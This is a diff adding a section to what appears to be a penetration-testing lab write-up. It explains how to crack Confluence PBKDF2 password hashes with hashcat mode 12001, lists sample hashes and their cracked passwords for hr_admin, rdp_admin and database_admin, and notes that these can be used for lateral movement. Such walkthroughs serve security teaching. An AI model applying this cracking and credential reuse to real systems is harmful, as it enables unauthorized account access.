@@ -312,3 +312,31 @@ The attacker now has the usernames and hashed passwords for the Confluence accou
 
 ### Cracking the Hash
 
+Confluence stores the passwords with the hash type Atlassian (PBKDF2-HMAC-SHA1) which is type 12001 according to the [list](https://hashcat.net/wiki/doku.php?id=example\_hashes) of hash types for Hashcat. The hashes should be arranged in a hash file one per line:
+
+```
+{PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
+{PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
+{PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
+{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
+{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
+{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
+```
+
+This can then be run through Hashcat:
+
+```
+kali@kali:~$ hashcat -m 12001 --show -o cracked.txt hashes.txt
+```
+
+This cracks three of the password hashes:
+
+{% code title="cracked.txt" %}
+```
+{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
+{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
+{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
+```
+{% endcode %}
+
+These are for the `hr_admin`, `rdp_admin`, and `database_admin` users respectively. At this point the attacker can use the discovered credentials to attempt to access other services or attempt to breach other resources visible to the `CONFLUENCE01` machine.
